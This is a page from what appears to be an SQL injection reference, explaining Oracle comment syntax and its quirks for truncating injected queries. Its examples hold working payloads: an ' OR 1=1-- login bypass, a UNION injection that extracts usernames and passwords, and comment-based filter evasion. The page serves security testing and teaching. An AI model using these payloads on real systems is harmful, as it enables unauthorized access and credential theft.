---
title: Comment Out Query
description: How to comment out queries in Oracle Database
category: Basics
order: 2
tags: ["basics", "syntax", "comments"]
lastUpdated: 2026-10-08
---

When performing SQL injection attacks against Oracle databases, commenting out the remainder of a query is often necessary to ensure that the injection payload works correctly without syntax errors. Oracle provides specific syntaxes for commenting.

## Oracle Comment Syntax

Oracle supports two methods for commenting out query parts:

| Comment Type        | Syntax      | Description                                    |
| ------------------- | ----------- | ---------------------------------------------- |
| Single-line comment | `--`        | Comments out everything to the end of the line |
| Block comment       | `/* ... */` | Can span multiple lines                        |

## Single-Line Comments

The double dash `--` is the most common way to comment out the rest of a query in Oracle:

```sql
SELECT * FROM users WHERE username = 'admin'-- ' AND password = 'something'
```

Unlike MySQL, Oracle does not need a space after the double dash:

```sql
-- Both are valid and return the admin row
SELECT * FROM users WHERE username = 'admin'-- AND password = 'test'
SELECT * FROM users WHERE username = 'admin'--AND password = 'test'
```

## Block Comments

Block comments start with `/*` and end with `*/`:

```sql
SELECT * FROM users WHERE username = 'admin'/* AND password = 'something' */
```

Block comments are useful when you need to comment out code in the middle of a statement:

```sql
SELECT id, username /* , password */ FROM users
```

## Examples in SQL Injection Context

### Login Bypass

```sql
-- Original query:
SELECT * FROM users WHERE username = 'input1' AND password = 'input2'

-- Injection with comment:
' OR 1=1--

-- Resulting query:
SELECT * FROM users WHERE username = '' OR 1=1--' AND password = 'input2'
```

### UNION Attack

```sql
-- Original query (numeric parameter, three columns):
SELECT id, title, content FROM articles WHERE id = input

-- Injection with comment:
-1 UNION SELECT NULL, username, password FROM users--

-- Resulting query:
SELECT id, title, content FROM articles WHERE id = -1 UNION SELECT NULL, username, password FROM users--
```

## Oracle-Specific Notes

Unlike some other database systems, Oracle:

1. Does not support the hash (`#`) comment syntax (`ORA-00911: invalid character`)
2. Does not require a space after the double dash, so `--` and the MySQL-style `-- -` both work
3. Does not support nested block comments: in `/* outer /* inner */ outer */` the comment ends at the first `*/`
4. Ends a `--` comment only at a line feed (`%0A`): a carriage return (`%0D`) stays inside the comment, unlike PostgreSQL and SQL Server

## Practical Applications

### Terminating Complex Queries

For complex queries with multiple conditions, commenting is essential:

```sql
-- Original query with multiple WHERE conditions
SELECT * FROM products WHERE category = 'input' AND price > 0 AND id < 100

-- Injection with comment to bypass additional conditions
' OR 1=1--

-- Resulting query
SELECT * FROM products WHERE category = '' OR 1=1--' AND price > 0 AND id < 100
```

### Replacing Spaces

If spaces are filtered, an empty block comment separates keywords just as well:

```sql
SELECT/**/username/**/FROM/**/users/**/WHERE/**/id=1--
```

### Multi-Line Payloads

A block comment can absorb line breaks in the rest of the query, and `--` then ends whatever is left on the last line:

```sql
' OR 1=1 /*
complex
multi-line
logic
*/--
```
